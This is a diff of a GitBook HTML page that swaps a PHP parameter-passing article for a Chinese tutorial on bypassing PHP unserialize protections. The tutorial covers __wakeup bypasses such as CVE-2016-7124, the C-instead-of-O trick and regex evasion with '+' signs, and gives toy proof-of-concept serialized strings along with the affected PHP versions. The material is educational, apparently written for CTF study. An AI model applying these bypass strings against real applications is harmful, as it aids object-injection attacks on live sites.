@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>参数传递 · GitBook</title>
+        <title>反序列化中的绕过 · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,8 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="REQUEST数组.html" />
+    <link rel="next" href="ctf_unserialize.html" />
     
-    
-    <link rel="prev" href="编码.html" />
     
 
     </head>
@@ -155,7 +153,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.3.3" data-path="参数传递.html">
+        <li class="chapter " data-level="1.3.3" data-path="参数传递.html">
             
                 <a href="参数传递.html">
             
@@ -420,7 +418,7 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.6.1" data-path="unserialize_bypass.html">
+        <li class="chapter active" data-level="1.6.1" data-path="unserialize_bypass.html">
             
                 <a href="unserialize_bypass.html">
             
@@ -862,7 +860,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >参数传递</a>
+        <a href=".." >反序列化中的绕过</a>
     </h1>
 </div>
 
@@ -877,20 +875,184 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="php&#x4E2D;&#x7684;&#x51FD;&#x6570;">PHP&#x4E2D;&#x7684;&#x51FD;&#x6570;</h1>
-<h2 id="&#x65E0;&#x53C2;&#x51FD;&#x6570;&#x53EF;&#x63A5;&#x53D7;&#x53C2;&#x6570;">&#x65E0;&#x53C2;&#x51FD;&#x6570;&#x53EF;&#x63A5;&#x53D7;&#x53C2;&#x6570;</h2>
-<p>&#x6709;&#x5982;&#x4E0B;&#x51FD;&#x6570;</p>
+                                <h1 id="wakeup&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7ED5;&#x8FC7;">wakeup&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7ED5;&#x8FC7;</h1>
+<h2 id="cve-2016-7124">CVE-2016-7124</h2>
+<p>&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>5.0.0 - 5.0.5</li>
+<li>5.1.0 - 5.1.6</li>
+<li>5.2.0 - 5.2.17</li>
+<li>5.3.0 - 5.3.29</li>
+<li>5.4.0 - 5.4.45</li>
+<li>5.5.0 - 5.5.38</li>
+<li>5.6.0 - 5.6.24</li>
+<li>7.0.0 - 7.0.9</li>
+</ul>
+<p>&#x6D4B;&#x8BD5;&#x811A;&#x672C; \<a href="https://3v4l.org/a4BrQ\" target="_blank">https://3v4l.org/a4BrQ\</a></p>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>{
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
+    <span class="hljs-keyword">public</span> $a=<span class="hljs-string">&apos;a&apos;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{
+        <span class="hljs-keyword">echo</span> $this-&gt;a;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>{
+        $this-&gt;a=<span class="hljs-string">&apos;b&apos;</span>;
+    }
 }
+
+
+<span class="hljs-comment">// echo serialize(new test());</span>
+<span class="hljs-comment">// O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</span>
+
+unserialize(<span class="hljs-string">&apos;O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;s:1:&quot;a&quot;;}&apos;</span>);
 </code></pre>
-<p>&#x53EF;&#x77E5;&#x51FD;&#x6570;<code>a</code>&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x4ECD;&#x53EF;&#x4EE5;&#x4F20;&#x9012;&#x4F20;&#x9012;&#x53C2;&#x6570;&#x7ED9;&#x51FD;&#x6570;<code>a</code>&#xFF0C;&#x4E14;&#x4E0D;&#x4F1A;&#x62A5;&#x9519;</p>
+<h2 id="cve-2016-7124&#x7684;&#x7ED5;&#x8FC7;">CVE-2016-7124&#x7684;&#x7ED5;&#x8FC7;</h2>
+<p>&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>7.0.0 - 7.0.14</li>
+<li>7.1.0</li>
+<li>5.4.14 - 5.4.45</li>
+<li>5.5.0 - 5.5.38</li>
+<li>5.6.0 - 5.6.29</li>
+</ul>
+<p>&#x6D4B;&#x8BD5;&#x811A;&#x672C; \<a href="https://3v4l.org/iLSA7\" target="_blank">https://3v4l.org/iLSA7\</a></p>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>{
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;
+<span class="hljs-comment">//https://3v4l.org/iLSA7</span>
+<span class="hljs-comment">//https://bugs.php.net/bug.php?id=73367</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span> </span>{
+    <span class="hljs-keyword">var</span> $ryat;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>{
+        $this-&gt;ryat = <span class="hljs-keyword">null</span>;
+        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&quot;Not a serializable object&quot;</span>);
+    }
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">if</span> ($this-&gt;ryat == <span class="hljs-number">1</span>) {
+            var_dump(<span class="hljs-string">&apos;dtor!&apos;</span>);
+        }
+    }
 }
-a(<span class="hljs-string">&apos;1&apos;</span>,<span class="hljs-string">&apos;2&apos;</span>);
+
+$poc = <span class="hljs-string">&apos;O:3:&quot;obj&quot;:2:{s:4:&quot;ryat&quot;;i:1;i:0;O:3:&quot;obj&quot;:1:{s:4:&quot;ryat&quot;;R:1;}}&apos;</span>;
+unserialize($poc);
+
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<h2 id="&#x4F7F;&#x7528;c&#x4EE3;&#x66FF;o">&#x4F7F;&#x7528;C&#x4EE3;&#x66FF;O</h2>
+<p>&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>5.3.0 - 5.3.29</li>
+<li>5.4.0 - 5.4.45</li>
+<li>5.5.0 - 5.5.38</li>
+<li>5.6.0 - 5.6.40</li>
+<li>7.0.0 - 7.0.33</li>
+<li>7.1.0 - 7.1.33</li>
+<li>7.2.0 - 7.2.34</li>
+<li>7.3.0 - 7.3.28</li>
+<li>7.4.0 - 7.4.16</li>
+<li>8.0.0 - 8.0.3</li>
+<li>&#x53EA;&#x80FD;&#x6267;&#x884C;construct()&#x51FD;&#x6570;&#xFF0C;&#x65E0;&#x6CD5;&#x6DFB;&#x52A0;&#x4EFB;&#x4F55;&#x5185;&#x5BB9;</li>
+</ul>
+<p>&#x6D4B;&#x8BD5;&#x811A;&#x672C; \<a href="https://3v4l.org/YAje0\" target="_blank">https://3v4l.org/YAje0\</a></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">//https://3v4l.org/YAje0</span>
+<span class="hljs-comment">//https://bugs.php.net/bug.php?id=81151</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;
+    }
+}
+
+var_dump(unserialize(<span class="hljs-string">&apos;C:1:&quot;E&quot;:0:{}&apos;</span>));
+</code></pre>
+<h2 id="&#x5229;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x62A5;&#x9519;">&#x5229;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x62A5;&#x9519;</h2>
+<p>&#x5229;&#x7528;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>7.0.15 - 7.0.33</li>
+<li>7.1.1 - 7.1.33</li>
+<li>7.2.0 - 7.2.34</li>
+<li>7.3.0 - 7.3.28</li>
+<li>7.4.0 - 7.4.16</li>
+<li>8.0.0 - 8.0.3</li>
+<li>&#x5229;&#x7528;&#x4E00;&#x4E2A;&#x5305;&#x542B;__destruct&#x65B9;&#x6CD5;&#x7684;&#x7C7B;&#x89E6;&#x53D1;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x53EF;&#x7ED5;&#x8FC7;__wakeup&#x65B9;&#x6CD5;&#x3002;</li>
+</ul>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>{
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($name)</span> </span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__get($name)\n&quot;</span>;
+    }
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__destruct\n&quot;</span>;
+    }
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__wakeup\n&quot;</span>;
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C::__destruct\n&quot;</span>;
+        $this-&gt;c-&gt;b;
+
+    }
+}
+
+
+unserialize(<span class="hljs-string">&apos;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:{};N;}&apos;</span>);
+</code></pre>
+<h1 id="&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6B63;&#x5219;&#x7ED5;&#x8FC7;">&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6B63;&#x5219;&#x7ED5;&#x8FC7;</h1>
+<h2 id="&#x5B57;&#x7B26;o&#x7ED5;&#x8FC7;">&#x5B57;&#x7B26;O&#x7ED5;&#x8FC7;</h2>
+<p>&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&lt;7.1.33</li>
+</ul>
+<p>&#x6D4B;&#x8BD5;&#x811A;&#x672C;&#xFF1A;\<a href="https://3v4l.org/YclXi\" target="_blank">https://3v4l.org/YclXi\</a></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">//https://3v4l.org/YclXi</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>{
+
+}
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>{
+
+}
+
+
+unserialize(<span class="hljs-string">&apos;O:+1:&quot;C&quot;:0:{}&apos;</span>);
+</code></pre>
+<h2 id="&#x5B57;&#x7B26;i&#x3001;d&#x7ED5;&#x8FC7;">&#x5B57;&#x7B26;i&#x3001;d&#x7ED5;&#x8FC7;</h2>
+<p>&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&lt;8.0.3 &#xFF08;&#x5168;&#x7248;&#x672C;&#xFF09;</li>
+</ul>
+<p>&#x6D4B;&#x8BD5;&#x811A;&#x672C; \<a href="https://3v4l.org/SJm2g\" target="_blank">https://3v4l.org/SJm2g\</a></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">//https://3v4l.org/SJm2g</span>
+<span class="hljs-comment">// echo serialize(0);</span>
+
+<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-string">&apos;i:-1;&apos;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-string">&apos;i:+1;&apos;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-string">&apos;d:-1.1;&apos;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-string">&apos;d:+1.2;&apos;</span>);
 </code></pre>
 
                                 
@@ -919,12 +1081,8 @@ a(<span class="hljs-string">&apos;1&apos;</span>,<span class="hljs-string">&apos
 
             
                 
-                <a href="编码.html" class="navigation navigation-prev " aria-label="Previous page: PHP编码">
-                    <i class="fa fa-angle-left"></i>
-                </a>
                 
-                
-                <a href="REQUEST数组.html" class="navigation navigation-next " aria-label="Next page: REQUEST数组数值获取顺序">
+                <a href="ctf_unserialize.html" class="navigation navigation-next navigation-unique" aria-label="Next page: CTF中的反序列化">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -935,7 +1093,7 @@ a(<span class="hljs-string">&apos;1&apos;</span>,<span class="hljs-string">&apos
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"参数传递","level":"1.3.3","depth":2,"next":{"title":"REQUEST数组数值获取顺序","level":"1.3.4","depth":2,"path":"PHP/REQUEST数组.md","ref":"./PHP/REQUEST数组.md","articles":[]},"previous":{"title":"PHP编码","level":"1.3.2","depth":2,"path":"PHP/编码.md","ref":"./PHP/编码.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/参数传递.md","mtime":"2021-05-21T00:55:03.024Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-06-18T03:58:40.208Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"反序列化中的绕过","level":"1.6.1","depth":2,"next":{"title":"CTF中的反序列化","level":"1.6.2","depth":2,"path":"PHP/ctf_unserialize.md","ref":"./PHP/ctf_unserialize.md","articles":[]},"previous":{"title":"0x04 反序列化","level":"1.6","depth":1,"ref":"","articles":[{"title":"反序列化中的绕过","level":"1.6.1","depth":2,"path":"PHP/unserialize_bypass.md","ref":"./PHP/unserialize_bypass.md","articles":[]},{"title":"CTF中的反序列化","level":"1.6.2","depth":2,"path":"PHP/ctf_unserialize.md","ref":"./PHP/ctf_unserialize.md","articles":[]},{"title":"查找存在指定魔术方法的类","level":"1.6.3","depth":2,"path":"PHP/查找存在指定魔术方法的类.md","ref":"./PHP/查找存在指定魔术方法的类.md","articles":[]},{"title":"SimpleXMLElement","level":"1.6.4","depth":2,"path":"PHP/SimpleXMLElement.md","ref":"./PHP/SimpleXMLElement.md","articles":[]},{"title":"Phar的文件包含与反序列化","level":"1.6.5","depth":2,"path":"PHP/Phar的文件包含与反序列化.md","ref":"./PHP/Phar的文件包含与反序列化.md","articles":[]},{"title":"Soap和CRLF攻击","level":"1.6.6","depth":2,"path":"PHP/Soap和CRLF攻击.md","ref":"./PHP/Soap和CRLF攻击.md","articles":[]},{"title":"SESSION的不同解析方式","level":"1.6.7","depth":2,"path":"PHP/Session不同解析方式.md","ref":"./PHP/Session不同解析方式.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/unserialize_bypass.md","mtime":"2021-06-18T03:12:17.384Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-06-18T03:58:40.208Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
